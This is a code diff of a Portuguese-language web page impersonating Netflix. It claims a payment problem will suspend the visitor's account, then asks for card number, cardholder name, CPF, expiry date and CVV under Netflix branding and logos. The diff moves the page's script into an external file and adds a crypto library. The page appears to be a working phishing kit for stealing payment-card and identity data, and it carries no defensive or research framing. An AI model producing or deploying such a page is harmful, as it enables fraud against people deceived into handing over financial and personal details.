@@ -5,58 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-512.png" type="image/x-icon">
     <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/logos-and-brands/512/227_Netflix_logo-512.png" type="image/x-icon">
-	<link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="index.css">
     <title>Netflix | Atualizar pagamento</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="scripts.js"></script>
 </head>
-	<body>
-		<div class="header">
-			<h1 class="logo">NETFLIX</h1>
-			<div class="profile-container">
-		<div class="profile-icon" onclick="showMessage()"></div>
-		<div id="message" class="message">Por favor, atualize seu pagamento.</div>
-	</div>
-
+<body>
+    <div class="header">
+        <h1 class="logo">NETFLIX</h1>
+        <div class="profile-container">
+            <div class="profile-icon" onclick="showMessage()"></div>
+            <div id="message" class="message">Por favor, atualize seu pagamento.</div>
+        </div>
     </div>
+
     <p>Identificamos um problema com a sua forma de pagamento na Netflix. Para evitar a suspensão da sua conta, pedimos que você atualize suas informações de pagamento hoje.</p>
-	
-    <label class="toggleSwitch nolabel" onclick="">
-    <input type="checkbox" checked />
-    <a></a>
-		<span>
-			<span class="left-span">Debito</span>
-			<span class="right-span">Credito</span>
-		</span>											
+    
+    <label class="toggleSwitch nolabel">
+        <input type="checkbox" checked />
+        <a></a>
+        <span>
+            <span class="left-span">Débito</span>
+            <span class="right-span">Crédito</span>
+        </span>                                           
     </label>
 
-	<form action="pay.php" method="post">
+    <form method="post">
         <div class="form-group">
-            <input type="text" class="imputtext" id="cardNumber" name="cardNumber" placeholder="Número do cartão" minlength="19" maxlength="19" oninput="formatarNumeroCartao(this)" required>
+            <input type="text" class="imputtext" id="cardNumber" name="cardNumber" placeholder="Número do cartão" minlength="19" maxlength="19" required>
         </div>
         <div class="form-group">
             <input type="text" name="card_name" id="card-name" placeholder="Nome do cartão" required>
         </div>
         <div class="form-group">
-            <input type="text" class="imputtext" id="cpf" name="cpf" placeholder="CPF" minlength="14" maxlength="14" onkeyup="formatarCPF(this)" required>
+            <input type="text" class="imputtext" id="cpf" name="cpf" placeholder="CPF" minlength="14" maxlength="14" required>
         </div>
         <div class="form-group">
-            <input type="text" class="imputtext" id="expiryDate" name="expiryDate" placeholder="Data de validade" minlength="7" maxlength="7" onkeyup="formatarData(this)" required>
+            <input type="text" class="imputtext" id="expiryDate" name="expiryDate" placeholder="Data de validade" minlength="7" maxlength="7" required>
         </div>
         <div class="form-group">
-            <input type="text" class="imputtext" id="cvv" name="cvv" placeholder="CVV" minlength="3" maxlength="4" oninput="formatarCVV(this)" required>
+            <input type="text" class="imputtext" id="cvv" name="cvv" placeholder="CVV" minlength="3" maxlength="4" required>
         </div>
 
-        <span class="logos logos-block" data-uia="cardLogos-comp" aria-label="Aceitamos Visa, Mastercard, American Express, Elo e Hipercard.">     
-            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="Visa" class="logoIcon VISA default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png 2x" data-uia="logoIcon-VISA">
-            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="Mastercard" class="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png 2x" data-uia="logoIcon-MASTERCARD">
-            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png" alt="American Express" class="logoIcon AMEX default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX@2x.png 2x" data-uia="logoIcon-AMEX">
-            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/ELO.png" alt="Elo" class="logoIcon ELO default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/ELO@2x.png 2x" data-uia="logoIcon-ELO">
-            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/HIPERCARD.png" alt="Hipercard" class="logoIcon HIPERCARD default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/HIPERCARD@2x.png 2x" data-uia="logoIcon-HIPERCARD">
+        <span class="logos logos-block" aria-label="Aceitamos Visa, Mastercard, American Express, Elo e Hipercard.">     
+            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="Visa" class="logoIcon VISA default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA@2x.png 2x">
+            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="Mastercard" class="logoIcon MASTERCARD default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD@2x.png 2x">
+            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png" alt="American Express" class="logoIcon AMEX default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX@2x.png 2x">
+            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/ELO.png" alt="Elo" class="logoIcon ELO default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/ELO@2x.png 2x">
+            <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/HIPERCARD.png" alt="Hipercard" class="logoIcon HIPERCARD default-ltr-cache-kg1rox e18ygst00" srcset="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/HIPERCARD@2x.png 2x">
         </span>
         
         <button type="submit" class="btn">Atualizar</button>
     </form>
 
-	
     <div class="footer">
         <p>Questions? Call 1-844-505-2993</p>
         <p>
@@ -66,71 +67,5 @@
             <a href="#">Privacy</a>
         </p>
     </div>
-    <script>
-        function formatarNumeroCartao(input) {
-            let valor = input.value.replace(/\D/g, '');
-            valor = valor.substring(0, 16);
-            valor = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
-            input.value = valor;
-        }
-
-        function formatarData(input) {
-            let valor = input.value.replace(/\D/g, '');
-            let mes = valor.substring(0, 2);
-            let ano = valor.substring(2, 4);
-            
-            if (valor.length > 2) {
-                input.value = mes + (ano.length > 0 ? '/' + ano : '');
-            } else {
-                input.value = mes;
-            }
-        }
-
-        function formatarCVV(input) {
-            let valor = input.value.replace(/\D/g, '');
-            valor = valor.substring(0, 4);
-            input.value = valor;
-        }
-
-        document.getElementById('card-number').addEventListener('input', function() {
-            formatarNumeroCartao(this);
-        });
-
-        document.getElementById('expiry-date').addEventListener('input', function() {
-            formatarData(this);
-        });
-
-        document.getElementById('cvv').addEventListener('input', function() {
-            formatarCVV(this);
-        });
-
-        const toggleSwitch = document.getElementById('toggle-switch');
-        const options = toggleSwitch.querySelectorAll('.option');
-        let activeOption = 0;
-
-        toggleSwitch.addEventListener('click', () => {
-            activeOption = 1 - activeOption;
-            toggleSwitch.classList.toggle('active');
-            const leftOption = options[0];
-            const rightOption = options[1];
-            leftOption.style.color = activeOption === 0 ? 'black' : 'white';
-            rightOption.style.color = activeOption === 1 ? 'black' : 'white';
-        });
-
-    function showMessage() {
-        const message = document.getElementById('message');
-        message.classList.toggle('show');
-        setTimeout(() => {
-            message.classList.remove('show');
-        }, 5000);
-    }
-
-    function formatarCPF(input) {
-        let valor = input.value.replace(/\D/g, '');
-        valor = valor.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
-        input.value = valor;
-    }
-
-    </script>
 </body>
 </html>
